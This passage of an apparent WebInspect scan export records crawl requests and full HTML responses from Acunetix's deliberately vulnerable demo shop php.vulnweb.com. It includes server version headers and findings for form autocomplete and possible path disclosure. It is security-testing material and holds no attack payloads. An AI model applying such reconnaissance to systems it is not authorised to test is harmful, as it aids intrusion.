<!-- InstanceEnd --></html>
]]></RawResponse><Request id="3607E7419B6AF8069179E2E6CB83DB8B"><Method>GET</Method><Path>/</Path><File>artists</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=3</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>3</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="3607E7419B6AF8069179E2E6CB83DB8B";PSID="1C2302E11CB8EF7DA17F6BF587C55102";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="c957f4ba";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1b188a39";sc="1";tid="36";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>artists</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>artist: lyzae</h2><div class='story'><p><p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p>
<p>
Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
Cras venenatis. Aliquam posuere lobortis pede. Nullam fringilla urna id leo.
Praesent aliquet pretium erat. Praesent non odio. Pellentesque a magna a
mauris vulputate lacinia. Aenean viverra. Class aptent taciti sociosqu ad
litora torquent per conubia nostra, per inceptos hymenaeos. Aliquam lacus.
Mauris magna eros, semper a, tempor et, rutrum et, tortor.
</p></p><p><a href='listproducts.php?artist=3'>view pictures of the artist</a></p><p><a href='#' onClick="window.open('./comment.php?aid=3','comment','width=500,height=400')">comment on this artist</a></p></div>	
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:43 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>6193</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="1CDF5B56CF311BF69D9675E793D2E81A"><URL>http://php.vulnweb.com:80/listproducts.php?cat=1</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="ea330f1f-efb5-4566-a6bc-24b71e53306a"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="5642" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="1CDF5B56CF311BF69D9675E793D2E81A"><![CDATA[GET /listproducts.php?cat=1 HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="1CDF5B56CF311BF69D9675E793D2E81A";PSID="8681F4E7C8D52EA34B378320F672FB6F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="ff645717";
X-Request-Memo: ID="1eb41aac";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:43 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 7880

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Posters</h2><div class='story'><a href='product.php?pic=1'><h3>The shore</h3></a><p><a href='showimage.php?file=./pictures/1.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/1.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=1','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=2'><h3>Mistery</h3></a><p><a href='showimage.php?file=./pictures/2.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/2.jpg&size=160' width='160' height='100'></a>Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=2','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=3'><h3>The universe</h3></a><p><a href='showimage.php?file=./pictures/3.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/3.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet. Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=3','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=4'><h3>Walking</h3></a><p><a href='showimage.php?file=./pictures/4.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/4.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=4','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=5'><h3>Mean</h3></a><p><a href='showimage.php?file=./pictures/5.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/5.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=5','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=7'><h3>Trees</h3></a><p><a href='showimage.php?file=./pictures/7.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/7.jpg&size=160' width='160' height='100'></a>bla bla bla</p><p>painted by: <a href='artists.php?artist=2'>Blad3</a></p><p><a href='#' onClick="window.open('./comment.php?pid=7','comment','width=500,height=400')">comment on this picture</a></p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="1CDF5B56CF311BF69D9675E793D2E81A"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>cat=1</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>cat</Name><Value>1</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/categories.php</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="1CDF5B56CF311BF69D9675E793D2E81A";PSID="8681F4E7C8D52EA34B378320F672FB6F";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="67";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="ff645717";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="1eb41aac";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id='pageName'>Posters</h2><div class='story'><a href='product.php?pic=1'><h3>The shore</h3></a><p><a href='showimage.php?file=./pictures/1.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/1.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=1','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=2'><h3>Mistery</h3></a><p><a href='showimage.php?file=./pictures/2.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/2.jpg&size=160' width='160' height='100'></a>Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=2','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=3'><h3>The universe</h3></a><p><a href='showimage.php?file=./pictures/3.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/3.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet. Donec molestie.
Sed aliquam sem ut arcu.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=3','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=4'><h3>Walking</h3></a><p><a href='showimage.php?file=./pictures/4.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/4.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
Sed aliquam sem ut arcu. Phasellus sollicitudin.
</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=4','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=5'><h3>Mean</h3></a><p><a href='showimage.php?file=./pictures/5.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/5.jpg&size=160' width='160' height='100'></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.</p><p>painted by: <a href='artists.php?artist=1'>r4w8173</a></p><p><a href='#' onClick="window.open('./comment.php?pid=5','comment','width=500,height=400')">comment on this picture</a></p></div><div class='story'><a href='product.php?pic=7'><h3>Trees</h3></a><p><a href='showimage.php?file=./pictures/7.jpg' target='_blank'><img style='cursor:pointer' border='0' align='left' src='showimage.php?file=./pictures/7.jpg&size=160' width='160' height='100'></a>bla bla bla</p><p>painted by: <a href='artists.php?artist=2'>Blad3</a></p><p><a href='#' onClick="window.open('./comment.php?pid=7','comment','width=500,height=400')">comment on this picture</a></p></div></div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:43 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>7880</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="991928C5937B2E98B55DF77B779F5A58"><URL>http://php.vulnweb.com:80/listproducts.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="7d1a6879-f094-4a26-aa51-033525d31837"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" 